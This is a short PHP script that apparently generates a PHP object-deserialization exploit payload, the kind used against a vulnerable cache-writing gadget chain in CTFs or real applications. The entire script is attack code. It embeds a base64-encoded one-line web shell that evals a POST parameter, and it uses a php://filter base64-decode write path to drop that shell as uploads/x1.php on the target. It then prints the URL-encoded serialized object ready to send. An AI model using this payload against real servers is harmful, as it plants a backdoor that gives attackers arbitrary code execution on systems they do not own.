<?php

class A{

    protected $store;

    protected $key;

    protected $expire;

    public $cache;
    public $complete;
    public $auto_save;

    public function __construct()
    {
        $this->autosave = 0;
        $this->cache = array('aaaPD9waHAgZXZhbCgkX1BPU1RbeF0pOz8+');
        $this->complete = 1;
        $this->store = new B();
        $this->key = "php://filter/write=convert.base64-decode/resource=uploads/x1.php";
        $this->expire = 1;
    }
}

class B{
    public $options;

    public function __construct()
    {
        $this->options  = array("prefix"=>"","serialize"=>"trim");
    }
}

$a = new A();
echo urlencode(serialize($a));